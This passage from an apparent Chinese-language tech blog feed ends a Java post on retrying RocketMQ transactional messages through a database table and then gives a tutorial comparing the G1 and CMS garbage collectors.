now);</span><br><span class="line">            ps.setObject(++i, now);</span><br><span class="line">            int affect = ps.executeUpdate();</span><br><span class="line">            if (affect &lt;= 0) &#123;</span><br><span class="line">                throw new RuntimeException(&quot;insert mq msg affect : &quot; + affect);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (SQLException e) &#123;</span><br><span class="line">            throw new RuntimeException(e);</span><br><span class="line">        &#125; finally &#123;</span><br><span class="line">            close(ps);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    public static void updateMsgRetryTimes(DataSource dataSource, String id) &#123;</span><br><span class="line">        Connection conn = null;</span><br><span class="line">        PreparedStatement ps = null;</span><br><span class="line">        try &#123;</span><br><span class="line">            conn = dataSource.getConnection();</span><br><span class="line">            ps = conn.prepareStatement(&quot;update tb_mq_msg set retry_times = retry_times + 1, update_time = ? where id = ?&quot;);</span><br><span class="line">            int i = 0;</span><br><span class="line">            ps.setObject(++i, new Date());</span><br><span class="line">            ps.setObject(++i, id);</span><br><span class="line">            int affect = ps.executeUpdate();</span><br><span class="line">            if (affect &lt;= 0) &#123;</span><br><span class="line">                log.error(&quot;update mq msg retry_times failed. id:[&#123;&#125;]&quot;, id);</span><br><span class="line">                throw new RuntimeException(&quot;update mq msg retry_times failed. id:&quot; + id);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (SQLException e) &#123;</span><br><span class="line">            throw new RuntimeException(e);</span><br><span class="line">        &#125; finally &#123;</span><br><span class="line">            close(ps, conn);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    public static void deleteMsgById(DataSource dataSource, String id) &#123;</span><br><span class="line">        Connection conn = null;</span><br><span class="line">        PreparedStatement ps = null;</span><br><span class="line">        try &#123;</span><br><span class="line">            conn = dataSource.getConnection();</span><br><span class="line">            ps = conn.prepareStatement(&quot;delete from tb_mq_msg where id = ?&quot;);</span><br><span class="line">            int i = 0;</span><br><span class="line">            ps.setObject(++i, id);</span><br><span class="line">            int affect = ps.executeUpdate();</span><br><span class="line">            if (affect &lt;= 0) &#123;</span><br><span class="line">                log.error(&quot;delete mq msg failed. id:[&#123;&#125;]&quot;, id);</span><br><span class="line">                throw new RuntimeException(&quot;delete mq msg failed. id:&quot; + id);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (SQLException e) &#123;</span><br><span class="line">            throw new RuntimeException(e);</span><br><span class="line">        &#125; finally &#123;</span><br><span class="line">            close(ps, conn);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    private static void close(AutoCloseable... closeables) &#123;</span><br><span class="line">        if (closeables != null &amp;&amp; closeables.length &gt; 0) &#123;</span><br><span class="line">            for (AutoCloseable closeable : closeables) &#123;</span><br><span class="line">                if (closeable != null) &#123;</span><br><span class="line">                    try &#123;</span><br><span class="line">                        closeable.close();</span><br><span class="line">                    &#125; catch (Exception ignore) &#123;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    private static String toJson(Object payload) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            return MAPPER.writeValueAsString(payload);</span><br><span class="line">        &#125; catch (JsonProcessingException e) &#123;</span><br><span class="line">            throw new RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    private static Map&lt;String, Object&gt; fromJson(String payload) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            return MAPPER.readValue(payload, new TypeReference&lt;Map&lt;String, Object&gt;&gt;() &#123;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; catch (JsonProcessingException e) &#123;</span><br><span class="line">            throw new RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">@Slf4j</span><br><span class="line">@Component</span><br><span class="line">public class ApplicationContextUtils implements ApplicationContextAware &#123;</span><br><span class="line">    private static ApplicationContext applicationContext;</span><br><span class="line">    @Override</span><br><span class="line">    public void setApplicationContext(ApplicationContext applicationContext) throws BeansException &#123;</span><br><span class="line">        ApplicationContextUtils.applicationContext = applicationContext;</span><br><span class="line">        log.info(&quot;=== ApplicationContextUtils init ===&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public static ApplicationContext getApplicationContext() &#123;</span><br><span class="line">        return applicationContext;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    public static Object getBean(String name) &#123;</span><br><span class="line">        return getApplicationContext().getBean(name);</span><br><span class="line">    &#125;</span><br><span class="line">    public static &lt;T&gt; T getBean(Class&lt;T&gt; clazz) &#123;</span><br><span class="line">        return getApplicationContext().getBean(clazz);</span><br><span class="line">    &#125;</span><br><span class="line">    public static &lt;T&gt; T getBean(String name, Class&lt;T&gt; clazz) &#123;</span><br><span class="line">        return getApplicationContext().getBean(name, clazz);</span><br><span class="line">    &#125;</span><br><span class="line">    public static String findBeanName(Class clazz, Object obj) &#123;</span><br><span class="line">        Map&lt;String, Object&gt; beans = getApplicationContext().getBeansOfType(clazz);</span><br><span class="line">        for (Map.Entry&lt;String, Object&gt; entry : beans.entrySet()) &#123;</span><br><span class="line">            Object value = entry.getValue();</span><br><span class="line">            if (value == obj) &#123;</span><br><span class="line">                return entry.getKey();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>解决消息发送失败，使用定时任务重试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">@Slf4j</span><br><span class="line">@Component</span><br><span class="line">pubilc class MqMsgSchedule implements InitializingBean &#123;</span><br><span class="line">    private static final ScheduledThreadPoolExecutor EXECUTOR =</span><br><span class="line">            new ScheduledThreadPoolExecutor(1, new ThreadFactory() &#123;</span><br><span class="line">                AtomicInteger threadCount = new AtomicInteger(0);</span><br><span class="line">                @Override</span><br><span class="line">                public Thread newThread(Runnable r) &#123;</span><br><span class="line">                    return new Thread(r, &quot;mq-msg-&quot; + threadCount.getAndIncrement() + &quot;-&quot; + r.hashCode());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;, new ThreadPoolExecutor.DiscardPolicy());</span><br><span class="line">    @Override</span><br><span class="line">    public void afterPropertiesSet() throws Exception &#123;</span><br><span class="line">        EXECUTOR.scheduleAtFixedRate(new Runnable() &#123;</span><br><span class="line">            @Override</span><br><span class="line">            public void run() &#123;</span><br><span class="line">                retrySendTask();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, 0, 5000, TimeUnit.MILLISECONDS);</span><br><span class="line">    &#125;</span><br><span class="line">    public void retrySendTask() &#123;     </span><br><span class="line">        try &#123;</span><br><span class="line">            Map&lt;String, DataSource&gt; beans = ApplicationContextUtils.getApplicationContext().getBeansOfType(DataSource.class);</span><br><span class="line">            for (Map.Entry&lt;String, DataSource&gt; entry : beans.entrySet()) &#123;</span><br><span class="line">                List&lt;MqMsg&gt; mqMsgList = MqMsgDao.listMsg(entry.getValue());</span><br><span class="line">                for (MqMsg mqMsg : mqMsgList) &#123;</span><br><span class="line">                    if (mqMsg.getRetryTimes() &gt;= MqMsgDao.MAX_RETRY_TIMES) &#123; </span><br><span class="line">                        log.error(&quot;mqMsg retry times reach &#123;&#125;, id:[&#123;&#125;]&quot;, MqMsgDao.MAX_RETRY_TIMES, mqMsg.getId());</span><br><span class="line">                    &#125; else &#123;</span><br><span class="line">                        RocketMQTemplate rocketMQTemplate = (RocketMQTemplate) ApplicationContextUtils.getBean(mqMsg.getMqTemplateName());</span><br><span class="line">                        try &#123;</span><br><span class="line">                            rocketMQTemplate.syncSend(mqMsg.getMqDestination(),</span><br><span class="line">                                    mqMsg.getMessage(),</span><br><span class="line">                                    mqMsg.getMqTimeout(),</span><br><span class="line">                                    mqMsg.getMqDelayLevel());</span><br><span class="line">                            MqMsgDao.deleteMsgById(entry.getValue(), mqMsg.getId());</span><br><span class="line">                        &#125; catch (Exception e) &#123;</span><br><span class="line">                            MqMsgDao.updateMsgRetryTimes(entry.getValue(), mqMsg.getId());</span><br><span class="line">                            log.error(&quot;[task] mq send failed. mqMsg:[&#123;&#125;]&quot;, mqMsg, e);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            log.error(&quot;task error.&quot;, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>提供调用类<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">@Slf4j</span><br><span class="line">public final class MQTransactionHelper &#123;</span><br><span class="line">    public static void syncSend(final RocketMQTemplate rocketMQTemplate,</span><br><span class="line">                                final String destination,</span><br><span class="line">                                final Message message) &#123;</span><br><span class="line">        syncSend(rocketMQTemplate, destination, message,</span><br><span class="line">                rocketMQTemplate.getProducer().getSendMsgTimeout(), 0);</span><br><span class="line">    &#125;</span><br><span class="line">    public static void syncSend(final RocketMQTemplate rocketMQTemplate,</span><br><span class="line">                                final String destination,</span><br><span class="line">                                final Message message,</span><br><span class="line">                                final long timeout,</span><br><span class="line">                                final int delayLevel) &#123;</span><br><span class="line">        if (TransactionSynchronizationManager.isSynchronizationActive()) &#123;</span><br><span class="line">            TransactionSynchronizationManager.registerSynchronization(new MQTransactionSynchronization(</span><br><span class="line">                    rocketMQTemplate, destination, message, timeout, delayLevel</span><br><span class="line">            ));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>数据库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE `tb_mq_msg` (</span><br><span class="line">  `id` VARCHAR(64) NOT NULL,</span><br><span class="line">  `status` VARCHAR(20) NOT NULL COMMENT &apos;事件状态(待发布NEW)&apos;,</span><br><span class="line">  `mq_template_name` VARCHAR(1000) NOT NULL,</span><br><span class="line">  `mq_destination` VARCHAR(1000) NOT NULL,</span><br><span class="line">  `mq_timeout` BIGINT NOT NULL,</span><br><span class="line">  `mq_delay_level` INT NOT NULL,</span><br><span class="line">  `payload` TEXT NOT NULL,</span><br><span class="line">  `retry_times` INT NOT NULL,</span><br><span class="line">  `create_time` DATETIME NOT NULL,</span><br><span class="line">  `update_time` DATETIME NOT NULL,</span><br><span class="line">  PRIMARY KEY (`id`),</span><br><span class="line">  KEY `idx_status` (`status`)</span><br><span class="line">) ENGINE=INNODB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;</span><br></pre></td></tr></table></figure></p>
<p>源码：<a href="https://github.com/jsbxyyx/rmq-transaction" target="_blank" rel="noopener">https://github.com/jsbxyyx/rmq-transaction</a></p>
]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> java </tag>
            
            <tag> rocketmq </tag>
            
            <tag> spring </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[G1 垃圾收集器]]></title>
      <url>/2022/java-g1/</url>
      <content type="html"><![CDATA[<h1 id="G1-垃圾收集器"><a href="#G1-垃圾收集器" class="headerlink" title="G1 垃圾收集器"></a>G1 垃圾收集器</h1><p>Garbage-First (G1) 收集器是一种服务器式垃圾收集器，针对具有大内存的多处理器机器。它以高概率满足垃圾收集 (GC) 暂停时间目标，同时实现高吞吐量。 Oracle JDK 7 update 4 及更高版本完全支持 G1 垃圾收集器。 G1 收集器专为以下应用而设计：</p>
<ul>
<li>可以与 CMS 收集器等应用程序线程同时操作。</li>
<li>紧凑的可用空间，没有冗长的 GC 引起的暂停时间。</li>
<li>需要更多可预测的 GC 暂停持续时间。</li>
<li>不想牺牲很多吞吐量性能。</li>
<li>不需要更大的 Java 堆。<a id="more"></a>
G1 计划作为 Concurrent Mark-Sweep Collector (CMS) 的长期替代品。将 G1 与 CMS 进行比较，G1 是一个更好的解决方案。一个区别是 G1 是一个压缩收集器。 G1 充分压缩以完全避免使用细粒度的空闲列表进行分配，而是依赖于区域。这大大简化了收集器的各个部分，并且主要消除了潜在的碎片问题。此外，G1 提供比 CMS 收集器更可预测的垃圾收集暂停，并允许用户指定所需的暂停目标。</li>
</ul>
<h2 id="G1运行概览"><a href="#G1运行概览" class="headerlink" title="G1运行概览"></a>G1运行概览</h2><p>较旧的垃圾收集器（串行(serial)、并行(parallel)、CMS）都将堆分为三个部分：年轻代、老年代和固定内存大小的永久代。<br><img src="https://img-blog.csdnimg.cn/img_convert/4dd2a43fccd97c864ab2361268638d51.png" alt=""></p>
<p>所有内存对象最终都位于这三个部分之一中。</p>
<p>G1 收集器采用不同的方法。<br><img src="https://img-blog.csdnimg.cn/img_convert/a9734d03db66a1421d39f037806db4e5.png" alt=""><br>堆被划分为一组大小相等的堆区域，每个区域都是连续的虚拟内存范围。某些区域集被分配了与旧收集器相同的角色（eden、survivor、old），但它们没有固定的大小。这为内存使用提供了更大的灵活性。</p>
<p>在执行垃圾回收时，G1 以类似于 CMS 回收器的方式运行。 G1 执行一个并发的全局标记阶段来确定整个堆中对象的活跃度。标记阶段完成后，G1 知道哪些区域大部分是空的。它首先在这些区域收集，这通常会产生大量的可用空间。这就是为什么这种垃圾收集方法被称为 Garbage-First 的原因。顾名思义，G1 将其收集和压缩活动集中在堆中可能充满可回收对象的区域，即垃圾。 G1 使用停顿预测模型来满足用户定义的停顿时间目标，并根据指定的停顿时间目标选择要收集的区域数。</p>
<p>G1 识别为可以回收的区域使用疏散进行垃圾收集。 G1 将对象从堆的一个或多个区域复制到堆上的单个区域，并在此过程中压缩和释放内存。这种疏散在多处理器上并行执行，以减少暂停时间并提高吞吐量。因此，每次垃圾回收时，G1 都会在用户定义的暂停时间内持续工作以减少碎片。这超出了前两种方法的能力。 CMS（并发标记扫描）垃圾收集器不进行压缩。 ParallelOld 垃圾收集仅执行整个堆压缩，这会导致相当长的暂停时间。</p>
<p>需要注意的是，G1 不是实时收集器。它以高概率但不是绝对确定地满足设定的暂停时间目标。根据之前收集的数据，G1 会估计在用户指定的目标时间内可以收集多少个区域。因此，收集器有一个相当准确的区域收集成本模型，并且它使用该模型来确定要收集哪些区域以及要收集多少区域，同时保持在暂停时间目标内。</p>
<p>注意：G1 具有并发（与应用程序线程一起运行，例如，细化(refinement)、标记(marking)、清理(cleanup)）和并行（多线程，例如，STW）阶段。Full GC仍然是单线程的，但如果调整得当，您的应用程序应该避免Full GC。</p>
<h2 id="G1足迹"><a href="#G1足迹" class="headerlink" title="G1足迹"></a>G1足迹</h2><p>如果您从 ParallelOldGC 或 CMS 收集器迁移到 G1，您可能会看到更大的 JVM 进程大小。这主要与“记帐(accounting)”数据结构有关，例如记忆集(Remembered Sets)和集合集(Collection Sets)。</p>
<p>记忆集(Remembered Sets)或 RSets 将对象引用跟踪到给定区域。堆中的每个区域都有一个 RSet。RSet 支持区域的并行和独立收集。RSets 的总体足迹影响小于 5%。</p>
<p>Collection Sets 或 CSets 将在 GC 中收集的区域集。在 GC 期间，CSet 中的所有实时数据都会被撤出（复制/移动）。区域集可以是Eden、survivor 和/或 old generation。CSet 对 JVM 大小的影响不到 1%。</p>
<h2 id="G1-的推荐用例"><a href="#G1-的推荐用例" class="headerlink" title="G1 的推荐用例"></a>G1 的推荐用例</h2><p>G1 的第一个重点是为运行需要大堆且 GC 延迟有限的应用程序的用户提供解决方案。这意味着大约 6GB 或更大的堆大小，以及低于 0.5 秒的稳定且可预测的暂停时间。</p>
<p>如果应用程序具有以下一个或多个特征，则现在使用 CMS 或 ParallelOldGC 垃圾收集器运行的应用程序将受益于切换到 G1。</p>
<ul>
<li>Full GC 持续时间太长或太频繁。</li>
<li>对象分配率或提升率差异很大。</li>
<li>不需要的长时间垃圾收集或压缩暂停（超过 0.5 到 1 秒）</li>
</ul>
<p>注意：如果您使用的是 CMS 或 ParallelOldGC，并且您的应用程序没有经历长时间的垃圾收集暂停，则可以继续使用当前的收集器。使用最新的 JDK 不需要更改为 G1 收集器。</p>
<h1 id="使用-CMS-查看-GC"><a href="#使用-CMS-查看-GC" class="headerlink" title="使用 CMS 查看 GC"></a>使用 CMS 查看 GC</h1><h2 id="查看分代-GC-和-CMS"><a href="#查看分代-GC-和-CMS" class="headerlink" title="查看分代 GC 和 CMS"></a>查看分代 GC 和 CMS</h2><p>Concurrent Mark Sweep (CMS) 收集器（也称为并发低暂停收集器）收集tenured generation。它试图通过与应用程序线程同时进行大部分垃圾收集工作来最小化由于垃圾收集而导致的暂停。通常并发低暂停收集器不会复制或压缩活动对象。垃圾收集是在不移动活动对象的情况下完成的。如果碎片成为问题，请分配更大的堆。</p>
<p>注意：年轻代的 CMS 收集器使用与并行收集器相同的算法。</p>
<h3 id="CMS-收集阶段"><a href="#CMS-收集阶段" class="headerlink" title="CMS 收集阶段"></a>CMS 收集阶段</h3><p>CMS 收集器在老年代堆上执行以下阶段：<br>| 阶段 | 描述 |<br>| — | — |<br>| (1) 初始标记 STW | 老一代中的对象被“标记”为可访问的，包括那些可以从年轻代访问的对象。与Minor收集暂停时间相比，暂停时间通常较短。 |<br>| (2) 并发标记 | 在 Java 应用程序线程正在执行时，同时遍历可访问对象的永久生成对象图。从标记的对象开始扫描并传递标记从根可到达的所有对象。 mutator 在并发阶段 2、3 和 5 期间执行，并且在这些阶段期间在 CMS 生成中分配的任何对象（包括提升的对象）都会立即标记为活动的。 |<br>| (3)重新标记 STW | 在并发收集器完成跟踪该对象后，查找由于 Java 应用程序线程更新对象而被并发标记阶段遗漏的对象。 |<br>| (4)并发清楚 | 在标记阶段收集标识为无法访问的对象。死对象的集合将对象的空间添加到空闲列表以供以后分配。此时可能会发生死对象的合并。请注意，活动对象不会移动。 |<br>| (5) 复位 | 通过清除数据结构为下一次并发收集做准备。 |</p>
<h3 id="查看垃圾收集步骤"><a href="#查看垃圾收集步骤" class="headerlink" title="查看垃圾收集步骤"></a>查看垃圾收集步骤</h3><p>接下来，让我们一步步回顾CMS Collector的操作。</p>
<ol>
<li>CMS 收集器的堆结构<br>堆被分成三个空间。<br><img src="https://img-blog.csdnimg.cn/img_convert/1a954723b7925ce208eb0420e968ded6.png" alt=""></li>
</ol>
<p>年轻代分为Eden和两个survivor空间。老年代是一个连续的空间。对象收集就地完成。除非有Full GC，否则不会进行压缩。</p>
<ol>
<li>Young GC 在 CMS 中的工作原理<br>新生代为浅绿色，老年代为蓝色。如果您的应用程序已经运行了一段时间，这就是 CMS 的样子。对象分散在老年代区域周围。<br><img src="https://img-blog.csdnimg.cn/img_convert/8ad116e26175abcddf8fae91eb8c1b2a.png" alt=""></li>
</ol>
<p>使用 CMS，老年代对象被原地释放。他们没有四处移动。除非有Full GC，否则不会压缩空间。</p>
<ol>
<li><p>年轻一代合集<br>活动对象从Eden空间和survivor空间复制到另一个survivor空间。任何达到其老化阈值的旧对象都会被提升为老年代。<br><img src="https://img-blog.csdnimg.cn/img_convert/d1c97835b318e609beb213aeb750f521.png" alt=""></p>
</li>
<li><p>在年轻 GC 之后<br>在年轻 GC 之后，Eden 空间被清除，survivor空间之一被清除。<br><img src="https://img-blog.csdnimg.cn/img_convert/9382ad5bef9b3aef927d0791a69718bd.png" alt=""></p>
</li>
</ol>
<p>新提升的对象在图表上以深蓝色显示。绿色对象是尚未提升到老年代的幸存年轻代对象。</p>
<ol>
<li><p>带有 CMS 的老一代集合<br>两个STW事件发生：初始标记和备注。当老年代达到一定的占用率时，CMS就会启动。<br><img src="https://img-blog.csdnimg.cn/img_convert/48950d8324af55d8d5019d8e4539c494.png" alt=""><br>(1) 初始标记是一个短暂的暂停阶段，在此标记活动（可达）对象。(2) 并发标记在应用程序继续执行时发现活动对象。最后，在（3）重新标记阶段，发现在前一个阶段（2）并发标记期间遗漏的对象。</p>
</li>
<li><p>老年代收集 - 并发清除<br>在前一阶段未标记的对象将被原地释放。没有压缩 。<br><img src="https://img-blog.csdnimg.cn/img_convert/386feb8b606d6439a0f0bc78d7e4e4fc.png" alt=""></p>
</li>
</ol>
<p>注意：未标记的对象 == 死对象</p>
<ol>
<li>老一代合集-清除后<br>（4）清除阶段之后，可以看到已经释放了很多内存。您还会注意到没有进行任何压缩。<br><img src="https://img-blog.csdnimg.cn/img_convert/e2e153533c49255356e1d64397a7f784.png" alt=""></li>
</ol>
<p>最后，CMS 收集器将通过 (5) 重置阶段并等待下一次达到 GC 阈值。</p>
<h1 id="G1-垃圾收集器一步一步"><a href="#G1-垃圾收集器一步一步" class="headerlink" title="G1 垃圾收集器一步一步"></a>G1 垃圾收集器一步一步</h1><p>G1 收集器采用不同的方法来分配堆。下面的图片逐步回顾了 G1 系统。</p>
<ol>
<li><p>G1 堆结构<br>堆是一个内存区域，分为许多固定大小的区域。<br><img src="https://img-blog.csdnimg.cn/img_convert/76e749c5eef57caaf993e3bfebbe3c57.png" alt=""><br>区域大小由 JVM 在启动时选择。 JVM 通常针对大约 2000 个区域，大小从 1 到 32Mb 不等。</p>
</li>
<li><p>G1 堆分配<br>实际上，这些区域被映射为 Eden、Survivor 和老年代空间的逻辑表示。<br><img src="https://img-blog.csdnimg.cn/img_convert/631b1b5568b4f513c80dd64987ed2520.png" alt=""></p>
</li>
</ol>
<p>图片中的颜色显示了哪个区域与哪个角色相关联。活动对象从一个区域撤离（即复制或移动）到另一个区域。区域被设计为在停止或不停止所有其他应用程序线程的情况下并行收集。</p>
<p>如图所示，区域可以分配到 Eden、Survivor 和老年代区域。此外，还有第四类物体，称为巨大区域(Humongous regions)。这些区域旨在容纳标准区域大小的 50% 或更大的对象。它们被存储为一组连续的区域。最后一种类型的区域将是堆中未使用的区域。</p>
<p>注意：在撰写本文时，收集巨大对象尚未优化。因此，您应该避免创建这种大小的对象。</p>
<ol>
<li>G1 中的年轻代<br>堆被分成大约 2000 个区域。最小大小为 1Mb，最大大小为 32Mb。蓝色区域保存老年代对象，绿色区域保存年轻代对象。<br><img src="https://img-blog.csdnimg.cn/img_convert/69dd2b785860abebb19e1bd57872bf2b.png" alt=""></li>
</ol>
<p>请注意，这些区域不需要像旧的垃圾收集器那样是连续的。</p>
<ol>
<li>G1 中的Young GC<br>活动对象被疏散（即复制或移动）到一个或多个幸存者区域。如果满足老化阈值，则将一些对象提升到老年代区域。<br><img src="https://img-blog.csdnimg.cn/img_convert/76d379877f150fcec62a5a4cdcd9028e.png" alt=""></li>
</ol>
<p>这是一个STW的暂停。为下一次Young GC 计算 Eden 大小和Survivor 大小。保留会计信息以帮助计算大小。考虑到暂停时间目标之类的事情。</p>
<ol>
<li>使用 G1 结束 Young GC<br>活动对象已被疏散到Survivor区域或老年代区域。<br><img src="https://img-blog.csdnimg.cn/img_convert/b10ee22b557fbcd77f0f9918ad05d329.png" alt=""></li>
</ol>
<p>最近提升的对象以深蓝色显示。绿色的Survivor区域。</p>
<p>综上所述，G1中的年轻代可以这么说：</p>
<ul>
<li>堆是分割成多个区域的单个内存空间。</li>
<li>年轻代内存由一组不连续的区域组成。这使得在需要时可以轻松调整大小。</li>
<li>年轻代垃圾回收或Young GC 是STW事件。所有应用程序线程都为该操作停止。</li>
<li>Young GC 使用多个线程并行完成。</li>
<li>活动对象被复制到新的Survivor或老年代区域。</li>
</ul>
<h2 id="带有-G1-的老年代集合"><a href="#带有-G1-的老年代集合" class="headerlink" title="带有 G1 的老年代集合"></a>带有 G1 的老年代集合</h2><p>与 CMS 收集器一样，G1 收集器被设计为老年代对象的低暂停收集器。下表描述了老年代的 G1 收集阶段。</p>
<h3 id="G1-收集阶段-并发标记周期阶段"><a href="#G1-收集阶段-并发标记周期阶段" class="headerlink" title="G1 收集阶段 - 并发标记周期阶段"></a>G1 收集阶段 - 并发标记周期阶段</h3><p>G1 收集器在堆的老年代执行以下阶段。请注意，某些阶段是年轻代集合的一部分。</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>阶段</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>(1) 初始标记</td>
<td>这是一个STW事件。使用 G1，它搭载在正常的Young GC 上。标记可能引用老年代对象的Survivor区域（根区域）。</td>
</tr>
<tr>
<td>(2) 根区域扫描</td>
<td>扫描Survivor区域以获取对老年代的引用。这会在应用程序继续运行时发生。该阶段必须在Young GC 发生之前完成。</td>
</tr>
<tr>
<td>(3) 并发标记</td>
<td>在整个堆上查找活动对象。这发生在应用程序运行时。这个阶段可以被年轻代垃圾回收打断。</td>
</tr>
<tr>
<td>(4) 重新标记 (STW)</td>
<td>完成堆中活动对象的标记。使用一种称为开始时快照 (SATB) 的算法，该算法比 CMS 收集器中使用的算法快得多。</td>
</tr>
<tr>
<td>(5) 清除 (STW和并发)</td>
<td>1. 对活动对象和完全自由的区域执行记帐(accounting)。 （STW）2. 清除记忆的集合。 （STW）3. 重置空白区域并将它们返回到空闲列表。 （并发）</td>
</tr>
<tr>
<td>(*) 复制 (STW)</td>
<td>这些是STW以将活动对象撤离或复制到新的未使用区域的停止。这可以通过记录为 [GC pause (young)] 的年轻代区域来完成。或者记录为 [GC Pause (mixed)] 的年轻代和老年代区域。</td>
</tr>
</tbody>
</table>
</div>
<h3 id="G1老年代收集一步一步"><a href="#G1老年代收集一步一步" class="headerlink" title="G1老年代收集一步一步"></a>G1老年代收集一步一步</h3><p>定义完阶段后，让我们看看它们如何与 G1 收集器中的老年代交互。</p>
<ol>
<li><p>初始标记阶段<br>活动对象的初始标记搭载在年轻代垃圾收集上。在日志中，这被标记为 GC pause (young)(initial-mark)。<br><img src="https://img-blog.csdnimg.cn/img_convert/8c77877941e558ba071c7c2fa94f2767.png" alt=""></p>
</li>
<li><p>并发标记阶段<br>如果找到空区域（如“X”所示），它们会在重新标记阶段立即删除。此外，计算确定活跃度的“记账(accounting)”信息。<br><img src="https://img-blog.csdnimg.cn/img_convert/3f5689c8deaacecbce740f2eeb251f40.png" alt=""></p>
</li>
<li><p>重新标记阶段<br>空区域被移除并回收。现在计算所有区域的区域活跃度。<br><img src="https://img-blog.csdnimg.cn/img_convert/203938a4c0e45a7d7eb694f102ab883f.png" alt=""></p>
</li>
<li><p>复制/清理阶段<br>G1 选择“活跃度”最低的区域，即可以最快收集到的区域。然后这些区域会在Young GC 的同时被收集。这在日志中表示为 [GC pause (mixed)]。所以年轻一代和老一代同时被收集。<br><img src="https://img-blog.csdnimg.cn/img_convert/16cd81e7ac9547c0abaa7177d52f2f7e.png" alt=""></p>
</li>
<li><p>复制/清理阶段之后<br>所选区域已被收集并压缩为图中所示的深蓝色区域和深绿色区域。<br><img src="https://img-blog.csdnimg.cn/img_convert/e0ac721a1cb9b16e2a73cec4e2a8be46.png" alt=""></p>
</li>
</ol>
